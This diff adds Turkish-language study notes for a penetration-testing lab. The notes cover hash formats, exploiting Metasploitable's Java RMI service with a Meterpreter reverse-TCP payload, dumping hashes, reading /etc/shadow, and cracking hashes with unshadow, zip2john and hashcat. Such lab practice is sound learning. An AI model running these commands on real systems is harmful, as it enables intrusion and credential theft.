@@ -1,0 +1,60 @@
+Hashler:
+
+1-) MD5  kullanıcı_adı:$1$ şeklinde başlar
+
+2-) SHA512:$6$ şeklinde başlar.
+
+windows için:
+
+kullanıcı:500:ADFDKJFAŞ34534985SDFL:FSAJDDJEJAOPOIMIWQPDAĞKKĞASDKĞPEOPDAJQĞJ
+
+user, user group, lm, ntlm şeklinde parçalardan oluşur
+
+	
+	
+	
+	
+HASHLERİ TOPARLAMA:
+
+## Bu bölüm metasploitable'da bulunan java açığı yardımıyla hacleme işlemi yapıyoruz
+
+msfconsole
+
+use exploit/multi/misc/java_rmi_server
+
+show payload
+
+set payload java/meterpreter/reverse_tcp
+
+set rhost <ip>
+
+exploit
+########################## giriş yapıp hackledikten sonra:
+
+run post/linux/gather/hashdump    or for windows:    run post/windows/gather/hashdump /// hash dosyalarını verir.
+
+
+Bulunan hashleri metasploitablehash.txt olarak bir dosyaya kaydedelim.
+
+cat /etc/passwd  // bütün kullanıcıları verir
+
+cat /etc/shadow   //paswword hashlerin saklandığı yer.
+
+unshadow /etc/passwd /etc/shadow  //passwordleri hashleriyle birleştirir.
+
+//birleştirilen bu hashleri kalhash.txt adıyla kaydet
+
+
+
+hashcat indir ve yükle // kali linuxta zaten yüklü
+
+
+
+
+zip hashleri kırmak..
+
+zip2john <zip ismi>  > ziphash.txt
+
+hashcat -m 13600 ziphash.txt /usr/share/wordlists/fasttrack.txt 
+
+
